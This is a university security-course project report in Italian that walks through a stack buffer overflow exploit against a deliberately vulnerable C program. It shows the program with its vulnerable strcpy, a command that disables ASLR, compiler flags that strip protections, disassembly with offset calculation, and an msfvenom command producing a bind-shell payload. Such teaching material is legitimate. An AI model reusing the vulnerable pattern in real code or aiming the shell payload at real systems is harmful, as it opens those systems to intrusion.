![](./assets/sapienza.png){ width=50% }

Ingegneria Dell'Informazione, Informatica e Statica

### Progetto per il corso di sicurezza

# Attacco Buffer Overflow

## Introduzione
Con il termine "buffer overflow" o "buffer overrun", in programmazione
o sicurezza informatica, ci si riferisce al fenomeno in cui un processo
scrive piu' dati all'interno di un buffer di quanti quest'ultimo riesca
a contenere, sovrascrivendo le zone di memoria adiacenti.
L'obiettivo di questo progetto e' di sfruttare una vulnerabilita' stack
buffer overflow, al fine di ottenere una shell sul sistema target.

## Requisiti
Al fine di raggiungere l'obiettivo richiesto, le seguenti entita' sono state
predisposte:
- Target Application
- Target System
- Exploit
Di seguito, una descrizione approfondita su ciascuna di queste entita'.

## Target Application
L'applicazione vulnerabile e' stata opportunamente realizzata facendo uso del
linguaggio di programmazione C (GCC 16.1.1). Tale applicazione permette ai suoi
utenti di formattare testo in modo personalizzato e legge il testo da formattare
dallo standard input. Quando l'input fornito eccede la capacita' del buffer,
adoperato dal programma per contenerlo, uno stack buffer overflow si verifica.
La figura seguente mostra il codice C della funzione vulnerabile.

```c
FILE* vuln(void)
{
  char vulnbuf[256];
  char* buf = malloc(sizeof(char) * 512);
  size_t len = 0;
  int c;

  while ((c = getchar()) != EOF && len < 511) {
    buf[len++] = (char) c;
  }
  buf[len] = '\0';

  strcpy(vulnbuf, buf);

  return fmemopen(buf, 512, "r");
}
```

Come mostrato dal commento nel codice, se la lunghezza dell'input supera i 255 bytes,
l'invocazione alla funzione strcpy provoca' un overflow nel buffer 'vulnbuf'.
Affinche' sia possibile sfruttare tale overflow secondo le richieste del progetto, le
seguenti opzioni di compilazione sono stati adoperati:
1. -z execstack (Permette l'esecuzione di codice nello stack).
2. -fno-stack-protector (Istruisce il compilatore di non utilizzare meccanismi di protezione
  dello stack).
3. -no-pie (Istruisce il linker di generare un eseguibile con indirizzi fissi nel segmento
  del codice).

## Target System
Il Target System e' rappresentato dal sistema operativo che esegue il codice vulnerabile.
Una virtual machine, per ragioni di praticita' e presentazione, e' stata installata e
configurata per incontrare le necessita' imposte dai requisiti del progetto.
A tal proposito, un sistema operativo basato sul kernel Linux e' stato utilizzato e la
randomizzazione del layout dello spazio di indirizzi dei processi disattivato attraverso
il seguente comando shell:

```sh
echo 0 > /proc/sys/kernel/randomize_va_space
```

## Exploit
Nello sviluppo dell'exploit sono stati utilizzati strumenti software come gdb e metasploit.
Il GNU debugger (gdb) e' stato utilizzato per analizzare, verificare e testare la
vulnerabilita', dapprima utilizzando campioni di input utili a mostrare la sovrascrittura
dell'indirizzo di ritorno (facendo uso di one-liner perl) e dopo fornendo in input
l'exploit opportunamente costruito. Al fine di stabilire l'esatta distanza tra l'indizzo
base del buffer e l'indirizzo di ritorno, l'analisi del codice disassemblato della
funzione vulnerabile e' stata effettuata.

```asm
push   %rbp
mov    %rsp,%rbp
sub    $0x120,%rsp
mov    $0x200,%edi
call   0x400480 <malloc@plt>
mov    %rax,-0x10(%rbp)
movq   $0x0,-0x8(%rbp)
jmp    0x400927 <vuln+59>
mov    -0x8(%rbp),%rax
lea    0x1(%rax),%rdx
mov    %rdx,-0x8(%rbp)
mov    -0x10(%rbp),%rdx
add    %rdx,%rax
mov    -0x14(%rbp),%edx
mov    %dl,(%rax)
call   0x400450 <getchar@plt>
mov    %eax,-0x14(%rbp)
cmpl   $0xffffffff,-0x14(%rbp)
je     0x40093f <vuln+83>
cmpq   $0x1fe,-0x8(%rbp)
jbe    0x40090f <vuln+35>
mov    -0x10(%rbp),%rdx
mov    -0x8(%rbp),%rax
add    %rdx,%rax
movb   $0x0,(%rax)
mov    -0x10(%rbp),%rdx
lea    -0x120(%rbp),%rax
mov    %rdx,%rsi
mov    %rax,%rdi
call   0x4003b0 <strcpy@plt>
mov    -0x10(%rbp),%rax
mov    $0x402c45,%edx
mov    $0x200,%esi
mov    %rax,%rdi
call   0x4003a0 <fmemopen@plt>
leave
ret
```

Come mostrato in figura, il primo argomento della funzione strcpy (rdi) e' l'indirizzo
base del buffer di interesse. Il contenuto del registro rdi e' stato calcolato sottraendo
al base pointer (rbp) il valore esadecimale 120, che in decimale corrisponde a 288.
Quest'ultimo valore rappresenta il numero di bytes necessari a raggiungere il base pointer.
Per raggiungere l'indirizzo di ritorno (salvato dall'istruzione call al momento della
invocazione della funzione) 8 bytes di base pointer deveno essere conteggiati ai 288 bytes
calcolati in precedenza, per un totale di 296 bytes. Dopo il calcolo della distanza e'
stato possibile generare il payload, compito svolto con l'ausilio del framework Metasploit.
Il seguente comando shell produce un payload compatibile con il sistema target scelto e che,
una volta eseguito, crea un socket TCP in ascolto sulla porta 4444.

```sh
msfvenom \
    --platform linux \
    --arch x64 \
    --bad-chars '\x00' \
    --payload linux/x64/shell/bind_tcp \
    --format python
```
L'opzione --bad-chars '\\x00' istruisce a msfvenom di non utilizzare il null byte
(0x00) all'interno del payload. Questa precauzione è necessaria perché, nel nostro caso,
il payload viene copiato in un buffer tramite la funzione strcpy. Essendo strcpy
progettata per copiare stringhe terminate dal carattere nullo, la presenza di un null byte
all'interno del payload farebbe terminare anticipatamente la copia. Di conseguenza, solo
una parte del payload verrebbe copiata nel buffer, compromettendone il corretto funzionamento.
